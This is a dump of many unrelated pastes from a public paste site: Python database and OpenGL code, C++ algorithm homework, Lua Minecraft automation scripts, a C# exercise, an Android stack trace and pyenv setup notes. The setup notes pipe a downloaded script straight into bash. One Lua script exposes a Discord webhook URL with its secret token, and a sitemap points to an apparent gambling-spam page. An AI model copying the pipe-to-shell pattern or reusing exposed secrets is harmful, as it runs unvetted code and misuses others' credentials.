    create_async_engine,
    AsyncEngine,
)


class SessionFactory:
    def __init__(self, postgres_url: str):
        self.engine: AsyncEngine = create_async_engine(postgres_url, echo=False)
        self.async_session_maker: async_sessionmaker[AsyncSession] = async_sessionmaker(
            self.engine,
            class_=AsyncSession,
            expire_on_commit=False,
        )

    async def dispose(self) -> None:
        await self.engine.dispose()

    async def __call__(self) -> AsyncGenerator[AsyncSession, None]:
        async with self.async_session_maker() as session:
            yield session

# database.py
from collections.abc import AsyncGenerator

from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.orm import DeclarativeBase
from sqlalchemy import MetaData
import contextlib
from src.session_factory import SessionFactory


class Base(DeclarativeBase):
    metadata = MetaData()


session_factory: SessionFactory | None = None


async def get_async_session() -> AsyncGenerator[AsyncSession, None]:
    if session_factory is None:
        raise RuntimeError(""SessionFactory is not initialized"")
    async for session in session_factory():
        yield session


async def get_db_stub():
    raise NotImplementedError

# main.py

@asynccontextmanager
async def lifespan(app: FastAPI):
    db.session_factory = SessionFactory(settings.db.url_postgres)
    yield
    await db.session_factory.dispose()"
YnxViuZR,Untitled,BalerCoder,Python,Monday 24th of June 2024 03:51:11 PM CDT,"from OpenGL.GL import *
from OpenGL.GLUT import *
from OpenGL.GLU import *
import random

import math

W_Width, W_Height = 500, 500

ballx = bally = 0
speed = 10
ball_size = 2
create_new = False
rain_drops = []

class point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

def crossProduct(a, b):
    result = point()
    result.x = a.y * b.z - a.z * b.y
    result.y = a.z * b.x - a.x * b.z
    result.z = a.x * b.y - a.y * b.x
    return result

def convert_coordinate(x, y):
    global W_Width, W_Height
    a = x - (W_Width / 2)
    b = (W_Height / 2) - y 
    return a, b

def draw_points(x, y, s):
    glPointSize(s)
    glBegin(GL_POINTS)
    glVertex2f(x, y)
    glEnd()

def drawAxes():
    glLineWidth(1)
    glBegin(GL_LINES)
    glColor3f(1.0, 0.0, 0.0)
    glVertex2f(250, 0)
    glVertex2f(-250, 0)
    glColor3f(0.0, 0.0, 1.0)
    glVertex2f(0, 250)
    glVertex2f(0, -250)
    glEnd()

    glPointSize(5)
    glBegin(GL_POINTS)
    glColor3f(0, 1.0, 0.0)
    glVertex2f(0, 0)
    glEnd()

def draw_triangle(x1, y1, x2, y2, x3, y3):
    glPointSize(5)
    glBegin(GL_TRIANGLES)
    glVertex2f(x1, y1)
    glVertex2f(x2, y2)
    glVertex2f(x3, y3)
    glEnd()

def draw_lines(x1, y1, x2, y2):
    glPointSize(5)
    glBegin(GL_LINES)
    glVertex2f(x1, y1)
    glVertex2f(x2, y2)
    glEnd()

def keyboardListener(key, x, y):
    global ball_size
    if key == b'w':
        ball_size += 1
        print(""Size Increased"")
    if key == b's':
        ball_size -= 1
        print(""Size Decreased"")
    glutPostRedisplay()

def specialKeyListener(key, x, y):
    global speed
    global rain_drops
    #if key == GLUT_KEY_UP:
        #speed *= 2
        #print(""Speed Increased"")
    #if key == GLUT_KEY_DOWN:
        #speed /= 2
        #print(""Speed Decreased"")
    if key == GLUT_KEY_RIGHT:
        for j in rain_drops:
            j.x += 20
    if key == GLUT_KEY_LEFT:
        for j in rain_drops:
            j.x -= 20
    glutPostRedisplay()

def mouseListener(button, state, x, y):
    global ballx, bally, create_new
    if button == GLUT_LEFT_BUTTON:
        if state == GLUT_DOWN:
            print(x, y)
            c_X, c_y = convert_coordinate(x, y)
            ballx, bally = c_X, c_y
    if button == GLUT_RIGHT_BUTTON:
        if state == GLUT_DOWN:
            create_new = convert_coordinate(x, y)
    glutPostRedisplay()

def display():
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT)
    glClearColor(0, 0, 0, 0)
    glMatrixMode(GL_MODELVIEW)
    glLoadIdentity()
    gluLookAt(0, 0, 200, 0, 0, 0, 0, 1, 0)
    glMatrixMode(GL_MODELVIEW)

    draw_triangle(-100, 0, 100, 0, 0, 100)
    draw_lines(-100, 0, -100, -100)
    draw_lines(100, 0, 100, -100)
    draw_lines(-100, -100, 100, -100)
    
    draw_lines(-90, -10, -60, -10)
    draw_lines(-90, -10, -90, -40)
    draw_lines(-90, -40, -60, -40)
    draw_lines(-60, -10, -60, -40)
    draw_lines(-75, -10, -75, -40)
    draw_lines(-60, -25, -90, -25)
    
    draw_lines(90, -10, 90, -100)
    draw_lines(60, -10, 60, -100)
    draw_lines(90, -10, 60, -10)
    draw_lines(90, -100, 60, -100)
    draw_points(70, -55, 2)
    
    global ballx, bally, ball_size
    glColor3f(1.0, 1.0, 1.0) 
    draw_points(ballx, bally, ball_size)

    global rain_drops
    glColor3f(0.0, 0.0, 1.0)
    for drop in rain_drops:
        draw_points(drop.x, drop.y, 2)

    if create_new:
        m, n = create_new
        glBegin(GL_POINTS)
        glColor3f(0.7, 0.8, 0.6)
        glVertex2f(m, n)
        glEnd()

    glutSwapBuffers()

def animate():
    global rain_drops, speed
    for drop in rain_drops:
        drop.y -= speed
        if drop.y < -250:
            drop.y = 250
            drop.x = random.uniform(-250, 250)
    glutPostRedisplay()

def init():
    global rain_drops
    for _ in range(40):
        x = random.uniform(-250, 250)
        y = random.uniform(-250, 250)
        rain_drops.append(point(x, y))
    
    glClearColor(0, 0, 0, 0)
    glMatrixMode(GL_PROJECTION)
    glLoadIdentity()
    gluPerspective(104, 1, 1, 1000.0)

glutInit()
glutInitWindowSize(W_Width, W_Height)
glutInitWindowPosition(0, 0)
glutInitDisplayMode(GLUT_DEPTH | GLUT_DOUBLE | GLUT_RGB)
wind = glutCreateWindow(b""OpenGL Coding Practice"")
init()

glutDisplayFunc(display)
glutIdleFunc(animate)

glutKeyboardFunc(keyboardListener)
glutSpecialFunc(specialKeyListener)
glutMouseFunc(mouseListener)

glutMainLoop()
"
Zj8MdjM8,Untitled,BalerCoder,Python,Monday 24th of June 2024 03:36:31 PM CDT,"from OpenGL.GL import *
from OpenGL.GLUT import *
from OpenGL.GLU import *


def draw_points(x, y):
    glPointSize(5) #pixel size. by default 1 thake
    glBegin(GL_POINTS)
    glVertex2f(x,y) #jekhane show korbe pixel
    glEnd()
def draw_triangle(x1,y1,x2,y2,x3,y3):
    glPointSize(5)
    glBegin(GL_TRIANGLES)
    glVertex2f(x1,y1)
    glVertex2f(x2,y2)
    glVertex2f(x3,y3)
    glEnd()
def draw_lines(x1,y1,x2,y2):
    glPointSize(5)
    glBegin(GL_LINES)
    glVertex2f(x1,y1)
    glVertex2f(x2,y2)
    glEnd()

def iterate():
    glViewport(0, 0, 500, 500)
    glMatrixMode(GL_PROJECTION)
    glLoadIdentity()
    glOrtho(0.0, 15000, 0.0, 15000, 0.0, 1.0)
    glMatrixMode (GL_MODELVIEW)
    glLoadIdentity()

def showScreen():
    glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT)
    glLoadIdentity()
    iterate()
    glColor3f(0.25, 0.3, 0.0) #konokichur color set (RGB)
    #call the draw methods here
    glColor3f(0.25,0.3,0.0)
    draw_triangle(5000,6000,13000,6000,9000,8000)
    glColor3f(0.25,0.3,0.0)
    draw_lines(5000,6000,5000,2000)
    draw_lines(13000,6000,13000,2000)
    draw_lines(5000,2000,13000,2000)
    #window---------
    draw_lines(6000,4000,7000,4000)
    draw_lines(6000,5000,7000,5000)
    draw_lines(6000,5000,6000,4000)
    draw_lines(7000,5000,7000,4000)
    draw_lines(6500,4000,6500,5000)
    draw_lines(6000,4500,7000,4500)
    #door ------
    draw_lines(11000,2000,11000,5000)
    draw_lines(12500,2000,12500,5000)
    draw_lines(11000,2000,12500,2000)
    draw_lines(11000,5000,12500,5000)
    draw_points(12000,4000)
    glutSwapBuffers()



glutInit()
glutInitDisplayMode(GLUT_RGBA)
glutInitWindowSize(7000,7000) #window size
glutInitWindowPosition(0, 0)
wind = glutCreateWindow(b""OpenGL Coding Practice"") #window name
glutDisplayFunc(showScreen)

glutMainLoop()"
nFr8LwZ7,Untitled,Rzqmln224,PHP,Monday 24th of June 2024 03:21:08 PM CDT,"<urlset xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd"">
<!--   created with Free Online Sitemap Generator www.xml-sitemaps.com   -->
<url>
<loc>https://kontrak.hapindo.co.id/xgacor/</loc>
<lastmod>2024-06-25T03:20:24+00:00</lastmod>
</url>
</urlset>"
EghNsBFr,Untitled,pochti_da,C++,Monday 24th of June 2024 03:17:07 PM CDT,"#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

int CountLessOrEqual(const std::vector<int> &arr, int n)
{
    size_t right = arr.size();
    size_t left = 0;

    while (right - left > 1)
    {
        size_t middle = (left + right) / 2;

        if (arr[middle] > n)
            right = middle;
        else
            left = middle;
    }

    return left + 1;
}

int FindMedian(const std::vector<int> &arr1, const std::vector<int> &arr2)
{
    size_t L = arr1.size();
    
    int left = std::min(arr1[0], arr2[0]) - 1;
    int right = std::max(arr1[L - 1], arr2[L - 1]);
    while (right - left > 1)
    {
        int middle = (left + right) / 2;

        int numbersLessOrEqual = 
            CountLessOrEqual(arr1, middle) + 
            CountLessOrEqual(arr2, middle);
        
        if (numbersLessOrEqual >= L)
            right = middle;
        else
            left = middle;
    }

    return right;
}

int main() 
{
    int N, L;
    std::cin >> N >> L;

    std::vector<std::vector<int>> arrays(N);
    for (size_t i = 0; i < N; ++i)
    {
        int x1, d1, a, c, m;
        std::cin >> x1 >> d1 >> a >> c >> m;

        auto &array = arrays[i];
        array.resize(L);

        array[0] = x1;
        int currD = d1;
        for (size_t j = 1; j < L; ++j)
        {
            array[j] = array[j - 1] + currD;
            currD = (a * currD + c) % m;
        }
    }

    for (size_t i = 0; i < N; ++i)
    {
        for (size_t j = i + 1; j < N; ++j)
        {
            std::cout << FindMedian(arrays[i], arrays[j]) << '\n';
        }
    }

	return 0;
}"
Sb5NdxR8,Untitled,pochti_da,C++,Monday 24th of June 2024 03:15:41 PM CDT,"#include <iostream>
#include <string>
#include <vector>
#include <algorithm>

int CountLessOrEqual(const std::vector<int> &arr, int n)
{
    size_t right = arr.size();
    size_t left = 0;

    while (right - left > 1)
    {
        size_t middle = (left + right) / 2;

        if (arr[middle] > n)
            right = middle;
        else
            left = middle;
    }

    return right;
}

int FindMedian(const std::vector<int> &arr1, const std::vector<int> &arr2)
{
    size_t L = arr1.size();
    
    int left = std::min(arr1[0], arr2[0]) - 1;
    int right = std::max(arr1[L - 1], arr2[L - 1]);
    while (right - left > 1)
    {
        int middle = (left + right) / 2;

        int numbersLessOrEqual = 
            CountLessOrEqual(arr1, middle) + 
            CountLessOrEqual(arr2, middle);
        
        if (numbersLessOrEqual >= L)
            right = middle;
        else
            left = middle;
    }

    return right;
}

int main() 
{
    int N, L;
    std::cin >> N >> L;

    std::vector<std::vector<int>> arrays(N);
    for (size_t i = 0; i < N; ++i)
    {
        int x1, d1, a, c, m;
        std::cin >> x1 >> d1 >> a >> c >> m;

        auto &array = arrays[i];
        array.resize(L);

        array[0] = x1;
        int currD = d1;
        for (size_t j = 1; j < L; ++j)
        {
            array[j] = array[j - 1] + currD;
            currD = (a * currD + c) % m;
        }
    }

    for (size_t i = 0; i < N; ++i)
    {
        for (size_t j = i + 1; j < N; ++j)
        {
            std::cout << FindMedian(arrays[i], arrays[j]) << '\n';
        }
    }

	return 0;
}"
AQpiuND2,"File - input, output",ladyBugs21,C++,Monday 24th of June 2024 03:06:39 PM CDT,"#include <iostream>
#include <fstream>
#include <cstring>

int main() {

    std::ifstream file(""hi.txt"");
    if(!file.is_open()) {
        std::cout << ""Error!"" << std::endl;
        return -1;
    }
    std::string message;
    while(std::getline(file, message)) {
        file >> message;
    }
    file.close();

    std::ofstream outFile(""hi.txt"", std::ios::app | std::ios::out);
    if(!outFile.is_open()) {
        std::cout << ""Error!"" << std::endl;
        return -1;
    }
    outFile << message << "", Today is a good day""  << std::endl;
    outFile.close();

    return 0;
}"
aBgQ8Vj0,FN_3,Squanou,Lua,Monday 24th of June 2024 03:05:01 PM CDT,"local modem = peripheral.find(""modem"")
local monitor = peripheral.find(""monitor"")

if not modem then
    print(""Erreur: Modem non trouv√©. V√©rifiez la connexion et le nom du p√©riph√©rique."")
    return
end

if not monitor then
    print(""Erreur: Moniteur non trouv√©. V√©rifiez la connexion et le nom du p√©riph√©rique."")
    return
end

rednet.open(peripheral.getName(modem))

local function displayStatsOnMonitor(stats)

    monitor.setTextScale(1)
    monitor.setBackgroundColor(colors.black)
    monitor.setTextColor(colors.white)
    monitor.clear()

    -- Afficher le titre
    local title = ""Consommation de la base TsykiTeam en temps r√©el:""
    monitor.setCursorPos(1, 1)
    monitor.write(title)
    monitor.setCursorPos(1, 2)
    monitor.write(string.rep(""-"", #title))

    -- Afficher la barre de progression
    local energyStored = stats.energyStored
    local energyCapacity = stats.energyCapacity
    local energyPercent = stats.energyPercent

    local barTitle = string.format(""Utilisation de la capacit√©: %d%% (%d / %d RF)"", energyPercent, energyStored, energyCapacity)
    local barWidth = 20
    local barFill = math.floor(barWidth * (energyStored / energyCapacity))
    local barEmpty = barWidth - barFill

    local width, height = monitor.getSize()
    local x = math.floor((width - #barTitle) / 2)
    monitor.setCursorPos(x, 4)
    monitor.write(barTitle)

    monitor.setCursorPos(math.floor((width - barWidth * 2) / 2), 5)
    monitor.setBackgroundColor(colors.green)
    monitor.write(string.rep("" "", barFill * 2))
    monitor.setBackgroundColor(colors.red)
    monitor.write(string.rep("" "", barEmpty * 2))
    monitor.setBackgroundColor(colors.black)

    -- Afficher les autres informations
    monitor.setCursorPos(1, 7)
    monitor.write(string.format(""Capacit√©: %d RF"", energyCapacity))
    monitor.setCursorPos(1, 8)
    monitor.write(string.format(""Non utilis√©: %d RF"", energyCapacity - energyStored))
    monitor.setCursorPos(1, 9)
    monitor.write(string.format(""Consommation: %d RF/t"", stats.transfer or 0))
end

while true do
    local senderId, stats, protocol = rednet.receive(""flux_network_server"")
    
    if protocol == ""flux_network_server"" then
        displayStatsOnMonitor(stats)
    end

    os.sleep(0.1)
end
"
4M7kfey5,FN_1,Squanou,Lua,Monday 24th of June 2024 02:47:10 PM CDT,"local modem = peripheral.find(""modem"")

local energyCell = peripheral.find(""powah:energy_cell"")

if not energyCell then
    print(""Erreur: powah:energy_cell non trouv√©e. V√©rifiez la connexion et le nom du p√©riph√©rique."")
    return
end

if not modem then
    print(""Erreur: Modem non trouv√©."")
    return
else
    rednet.open(peripheral.getName(modem))

    local function getEnergyCellStats()
        local energyStored = energyCell.getEnergy()
        local energyCapacity = energyCell.getEnergyCapacity()
        local energyPercent = math.floor(energyStored / energyCapacity * 100)
        return energyStored, energyCapacity, energyPercent
    end

    while true do
        while true do
            local energyStored, energyCapacity, energyPercent = getEnergyCellStats()
     
            local stats = {
                energyStored = energyStored,
                energyCapacity = energyCapacity,
                energyPercent = energyPercent
            }
     
            rednet.broadcast(stats, ""flux_network_reactor"")
        end
    end

end"
kjMS8wWd,Flux,Squanou,Lua,Monday 24th of June 2024 02:24:28 PM CDT,"local flux = peripheral.find(""energyDetector"")

if flux == nil then
    error(""Aucun 'energyDetector' disponible."")
    return
else
    while true do
        print(""Currant transfert Rate : "" .. flux.getTransferRate() .. "" FE/t"")
        os.sleep(0.1)
    end
end"
s6xi5yty,PowahCellL,Squanou,Lua,Monday 24th of June 2024 02:14:21 PM CDT,"local modem = peripheral.find(""modem"")
local DiscordHook = require(""DiscordHook"")
local chatBox = peripheral.find(""chatBox"")

if not modem then
    print(""Erreur: Modem non trouv√©."")
    return
end

local energyCell = peripheral.find(""powah:energy_cell"")

if not energyCell then
    print(""Erreur: powah:energy_cell non trouv√©e. V√©rifiez la connexion et le nom du p√©riph√©rique."")
    return
end

local speaker = peripheral.find(""speaker"")

if not speaker then
    print(""Erreur: Speaker non trouv√©. Assurez-vous d'avoir un speaker connect√©."")
    return
end

rednet.open(peripheral.getName(modem))

local messageSent = false

local function playLowEnergySound()
    speaker.playSound(""block.note_block.chime"", 1, 1)
end

local function getEnergyCellStats()
    local energyStored = energyCell.getEnergy()
    local energyCapacity = energyCell.getEnergyCapacity()
    local energyPercent = math.floor(energyStored / energyCapacity * 100)
    return energyStored, energyCapacity, energyPercent
end

local function sendStats()
    while true do
        local energyStored, energyCapacity, energyPercent = getEnergyCellStats()

        local stats = {
            energyStored = energyStored,
            energyCapacity = energyCapacity,
            energyPercent = energyPercent
        }

        rednet.broadcast(stats, ""powah"")

        if energyPercent < 20 and not messageSent then
            local success, hook = DiscordHook.createWebhook(
                ""https://discord.com/api/webhooks/1254412774172393482/yp196njdT93B7z8FO2KbykMj6bmad-kHpXE5OgH7Ta_xHqfU_UnimQOM91TlF1dgeFtn"")

            if not success then
                error(""Webhook connection failed! Reason: "" .. hook)
            end

            if success then
                local message = ""TsykiBase> Attention l'√ânergie de la Cellule d'√©nergie Powah est en dessous des 20% :warning:""
                hook.send(message, ""Server"")
                messageSent = true
            end
            playLowEnergySound()
            local message = {
                { text = ""Attention ! Niveau d'√©nergie faible."", color = ""yellow"" }
            }
            
            local json = textutils.serialiseJSON(message)
            chatBox.sendFormattedMessageToPlayer(json, ""_Tsyke_"", ""[Info"")

        elseif energyPercent >= 20 and messageSent then
            messageSent = false
            local message = {
                { text = ""Le niveau d'√©nergie est revenue √† la normal."", color = ""yellow"" }
            }
            
            local json = textutils.serialiseJSON(message)
            chatBox.sendFormattedMessageToPlayer(json, ""_Tsyke_"", ""Info"")
        end

        sleep(1)
    end
end

sendStats()
"
2u4YFmG4,–î–ó –ü–æ–∏—Å–∫ –ø—Ä–µ—Å—Ç—É–ø–Ω–∏–∫–∞,TeT91,C#,Monday 24th of June 2024 01:53:04 PM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            PersonBase person = new PersonBase();
            person.ShowBanditsInfo();
        }
    }

    class PersonBase
    {
        private List<Person> _bandits;

        public PersonBase()
        {
            GenerateBase();
        }

        public void ShowBanditsInfo()
        {
            Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ —Ä–æ—Å—Ç:"");
            float height = SetFloat();

            Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ –≤–µ—Å:"");
            float weight = SetFloat();

            Console.WriteLine(""–í–≤–µ–¥–∏—Ç–µ –Ω–∞—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å"");
            string nationality = Console.ReadLine();

            var filteredList = _bandits.Where(bandit => bandit.Height > height).Where(bandit => bandit.Weight > weight).Where(bandit => bandit.Nationality == nationality).
                Where(bandit => bandit.IsFree);

            Console.WriteLine($""–ù–∞–π–¥–µ–Ω—ã–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏—è:"");
            ShowList(filteredList);

            Console.ReadKey();
        }

        private void ShowList(IEnumerable<Person> list)
        {
            foreach (Person person in list)
            {
                if (person.IsFree)
                {
                    Console.WriteLine($""{person.Surname} {person.Name} {person.Patronymic}"");
                }
            }
        }

        private float SetFloat()
        {
            bool isRunnig = true;
            float value = 0;

            while (isRunnig)
            {
                string userInput = Console.ReadLine();

                if (float.TryParse(userInput, out float result))
                {
                    value = result;
                    isRunnig = false;
                }
                else
                {
                    Console.WriteLine(""–ù–µ–≤–µ—Ä–Ω—ã–π –≤–≤–æ–¥"");
                }
            }

            return value;
        }

        private void GenerateBase()
        {
            PersonCreator creator = new PersonCreator();
            int dataBaseCapacity = 20;

            _bandits = new List<Person>();

            for (int i = 0; i < dataBaseCapacity; i++)
            {
                _bandits.Add(creator.CreatePerson());
            }
        }
    }


    class PersonCreator
    {
        private List<string> _names;
        private List<string> _surnames;
        private List<string> _patronymic;
        private List<string> _nationalities;

        public PersonCreator()
        {
            InitNames();
            InitSurnames();
            InitPatronymics();
            InitNationalities();
        }

        public Person CreatePerson()
        {
            int minHeight = 1;
            int maxHeight = 2;

            int minWeight = 56;
            int maxWeight = 100;

            string name = GetRandomValue(_names);
            string surname = GetRandomValue(_surnames);
            string patronymic = GetRandomValue(_patronymic);
            string nationalities = GetRandomValue(_nationalities);
            float weight = UserUtils.GenerateRandomValue(minWeight, maxWeight) + (float)UserUtils.GenerateRandomDouble();
            float height = UserUtils.GenerateRandomValue(minHeight, maxHeight) + (float)UserUtils.GenerateRandomDouble();

            return new Person(name, surname, patronymic, height, weight, nationalities, SetStatus());

        }

        private void InitSurnames()
        {
            _surnames = new List<string>();
            _surnames.Add(""–°–º–∏—Ä–Ω–æ–≤"");
            _surnames.Add(""–ò–≤–∞–Ω–æ–≤"");
            _surnames.Add(""–ö—É–∑–Ω–µ—Ü–æ–≤"");
            _surnames.Add(""–ü–æ–ø–æ–≤"");
            _surnames.Add(""–°–æ–∫–æ–ª–æ–≤"");
            _surnames.Add(""–õ–µ–±–µ–¥–µ–≤"");
            _surnames.Add(""–ö–æ–∑–ª–æ–≤"");
            _surnames.Add(""–ù–æ–≤–∏–∫–æ–≤"");
            _surnames.Add(""–ú–æ—Ä–æ–∑–æ–≤"");
            _surnames.Add(""–ö–æ–∑–ª–æ–≤"");
            _surnames.Add(""–í–æ–ª–∫–æ–≤"");
        }

        private void InitPatronymics()
        {
            _patronymic = new List<string>();
            _patronymic.Add(""–ú–∞–∫—Å–∏–º–æ–≤–∏—á"");
            _patronymic.Add(""–ú–∏—Ö–∞–∏–ª–æ–≤–∏—á"");
            _patronymic.Add(""–ê–ª–µ–∫—Å–∞–Ω–¥—Ä–æ–≤–∏—á"");
            _patronymic.Add(""–î–º–∏—Ç—Ä–∏–µ–≤–∏—á"");
            _patronymic.Add(""–î–µ–Ω–∏—Å–æ–≤–∏—á"");
            _patronymic.Add(""–ò–ª—å–∏—á"");
            _patronymic.Add(""–ê–Ω–¥—Ä–µ–µ–≤–∏—á"");
            _patronymic.Add(""–ê—Ä—Ç–µ–º–æ–≤–∏—á"");
            _patronymic.Add(""–ò–≤–∞–Ω–æ–≤–∏—á"");
            _patronymic.Add(""–ê–ª–µ–∫—Å–µ–µ–≤–∏—á"");
            _patronymic.Add(""–ù–∏–∫–∏—Ç–∏—á"");
        }

        private void InitNames()
        {
            _names = new List<string>();
            _names.Add(""–ú–∞–∫—Å–∏–º"");
            _names.Add(""–ú–∏—Ö–∞–∏–ª"");
            _names.Add(""–ê–ª–µ–∫—Å–∞–Ω–¥—Ä"");
            _names.Add(""–î–º–∏—Ç—Ä–∏–π"");
            _names.Add(""–î–µ–Ω–∏—Å"");
            _names.Add(""–ò–ª—å—è"");
            _names.Add(""–ê–Ω–¥—Ä–µ–π"");
            _names.Add(""–ê—Ä—Ç–µ–º"");
            _names.Add(""–ò–≤–∞–Ω"");
            _names.Add(""–ê–ª–µ–∫—Å–µ–π"");
            _names.Add(""–ù–∏–∫–∏—Ç–∞"");
        }

        private void InitNationalities()
        {
            _nationalities = new List<string>();
            _nationalities.Add(""–†—É—Å—Å–∫–∏–π"");
            _nationalities.Add(""–ù–µ —Ä—É—Å—Å–∫–∏–π"");
        }

        private string GetRandomValue(List<string> values)
        {
            int randomId = UserUtils.GenerateRandomValue(values.Count);
            return values[randomId];
        }

        private bool SetStatus()
        {
            int chance = 50;
            int maxChance = 100;

            return UserUtils.GenerateRandomValue(maxChance) > chance;
        }
    }

    class Person
    {
        public Person(string name, string surname, string patronymic, float height, float weight, string nationality, bool isFree)
        {
            Name = name;
            Surname = surname;
            Patronymic = patronymic;
            Height = height;
            Weight = weight;
            Nationality = nationality;
            IsFree = isFree;
        }

        public string Name { get; private set; }

        public string Surname { get; private set; }

        public string Patronymic { get; private set; }

        public float Height { get; private set; }

        public float Weight { get; private set; }

        public string Nationality { get; private set; }

        public bool IsFree { get; private set; }
    }

    static class UserUtils
    {
        private static Random s_random = new Random();

        public static int GenerateRandomValue(int maxValue)
        {
            return s_random.Next(maxValue);
        }

        public static int GenerateRandomValue(int minValue, int maxValue)
        {
            return s_random.Next(minValue, maxValue);
        }

        public static double GenerateRandomDouble()
        {
            return s_random.NextDouble();
        }
    }
}"
LTGusLm9,class public LzHcmdx/Vpn,HcMod,JavaScript,Monday 24th of June 2024 01:43:32 PM CDT,"PERMISSION: APP
ABI: armeabi-v7a
MODEL: UNKNOWN
SDK: 31
RELEASE: 12
TARGET_SDK: 30
---StackTrace---
ANRError: Application unresponsive for at least 96ms.
main (state = RUNNABLE)
    at android.graphics.HardwareRenderer.nDestroy(Native Method)
    at android.graphics.HardwareRenderer.destroy(HardwareRenderer.java:195)
    at android.view.ThreadedRenderer.destroy(ThreadedRenderer.java:282)
    at android.view.ViewRootImpl.destroyHardwareRenderer(ViewRootImpl.java:8459)
    at android.view.ViewRootImpl.dispatchDetachedFromWindow(ViewRootImpl.java:5190)
    at android.view.ViewRootImpl.doDie(ViewRootImpl.java:8381)
    at android.view.ViewRootImpl.die(ViewRootImpl.java:8354)
    at android.view.WindowManagerGlobal.removeViewLocked(WindowManagerGlobal.java:512)
    at android.view.WindowManagerGlobal.removeView(WindowManagerGlobal.java:453)
    at android.view.WindowManagerImpl.removeViewImmediate(WindowManagerImpl.java:162)
    at android.view.View.performClick(View.java:7448)
    at android.view.View.performClickInternal(View.java:7421)
    at android.view.View.access$3700(View.java:838)
    at android.view.View$PerformClick.run(View.java:28870)
    at android.os.Handler.handleCallback(Handler.java:938)
    at android.os.Handler.dispatchMessage(Handler.java:99)
    at android.os.Looper.loopOnce(Looper.java:201)
    at android.os.Looper.loop(Looper.java:288)
    at android.app.ActivityThread.main(ActivityThread.java:7986)
    at java.lang.reflect.Method.invoke(Native Method)
    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:553)
    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003)
work_thread (state = RUNNABLE)
    at android.os.MessageQueue.nativePollOnce(Native Method)
    at android.os.MessageQueue.next(MessageQueue.java:335)
    at android.os.Looper.loopOnce(Looper.java:161)
    at android.os.Looper.loop(Looper.java:288)
    at android.os.HandlerThread.run(HandlerThread.java:67)
queued-work-looper (state = RUNNABLE)
    at android.os.MessageQueue.nativePollOnce(Native Method)
    at android.os.MessageQueue.next(MessageQueue.java:335)
    at android.os.Looper.loopOnce(Looper.java:161)
    at android.os.Looper.loop(Looper.java:288)
    at android.os.HandlerThread.run(HandlerThread.java:67)
process reaper (state = TIMED_WAITING)
    at java.lang.UNIXProcess.waitForProcessExit(Native Method)"
cPYr1qyF,pyenv virtualenv,Templario_7777,Bash,Monday 24th of June 2024 01:37:01 PM CDT,"1** Install Dependencies:

sudo apt-get update && sudo apt-get install make build-essential libssl-dev \
    zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \
    libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev

2** Install Pyenv:

curl https://pyenv.run | bash

3** Config ~/.profile (copy and paste):

# Load pyenv automatically by appending
# the following to 
# ~/.bash_profile if it exists, otherwise ~/.profile (for login shells)
# and ~/.bashrc (for interactive shells) :
 
export PYENV_ROOT=""$HOME/.pyenv""
[[ -d $PYENV_ROOT/bin ]] && export PATH=""$PYENV_ROOT/bin:$PATH""
eval ""$(pyenv init -)""

4** config ~/.bashrc (copy and paste):

eval ""$(pyenv virtualenv-init -)""

5** reload enviroment:pyenv install

source ~/.bashrcpyenv install

6** Install python version 2.7:

pyenv install 2.7

7** create an venv over python version 2.7 (without < >)

pyenv virtualenv 2.7 <virtual_env_name> "
jA5x4X0h,Mining Turtle Reworked,Magnetar,Lua,Monday 24th of June 2024 01:31:01 PM CDT,"local args = {...}
-- north 0 osten 1 s√ºden 2 westen 3  | n z+1 o x+1 s z-1 w x-1 | hoch y+1 runter y-1
local function createVector(setx,sety,setz)
    return {x=setx,y=sety,z=setz}
end

function VectorAreEqual(vec1, vec2)
    return vec1.x == vec2.x and vec1.y == vec2.y and vec1.z == vec2.z
end

rows = 0
columns = 0
atHome = false
maxSlots = 16
facing = nil
actualCoordinates = createVector(0,0,0)
nextCheckPoint = createVector(0,0,0)
neededStepsForCheckPoint = 0
startCoordinates = createVector(0,0,0)
for key, value in pairs(startCoordinates) do
    print(key .. "": "" .. value)
end

function initilise()
    if #args == 2 then
        columns = tonumber(args[1])-1
        rows = tonumber(args[2])-1
    end
    
    if columns == 0 then
        term.clear()
        term.setCursorPos(1, 1)
        io.write(""Columns: "")
        columns = tonumber(io.read()) -1
    end
    
    if rows == 0 then
        term.clear()
        term.setCursorPos(1, 1)
        io.write(""Rows: "")
        rows = tonumber(io.read()) -1
    end
    
    term.clear()
    term.setCursorPos(1, 1)

    --end initial fase
end

function goTo(position)
    local x1, y1, z1 = gps.locate(5)
    while actualCoordinates.y < position.y do
        if tryUpwards() then
            --y1 = y1 +1
        else
            return true
        end
    end
    while actualCoordinates.y > position.y do
        if tryDownwards() then
            --y1 = y1 -1
        else 
            return true
        end
    end
    while actualCoordinates.z < position.z do
        --nach s√ºden
        faceTo(2)
        tryForwards()
    end
    while actualCoordinates.z > position.z do
        --nach norden
        faceTo(0)
        tryForwards()
    end
    while actualCoordinates.x > position.x do
        --nach westen
        faceTo(3)
        tryForwards()
    end
    while actualCoordinates.x < position.x do
        --nach osten
        faceTo(1)
        tryForwards()
    end
end

function faceTo(sideToFace)
    local diff = (sideToFace - facing) % 4
    if diff == 0 then
        return  -- Already facing the desired direction
    elseif diff == 1 then
        turtle.turnRight()
    elseif diff == 2 then
        turtle.turnRight()
        turtle.turnRight()
    elseif diff == 3 then
        turtle.turnLeft()
    end
    facing = sideToFace
end

local function turnLeft()
end

local function turnRight()
end

local function mine()
end

function checkFuel()
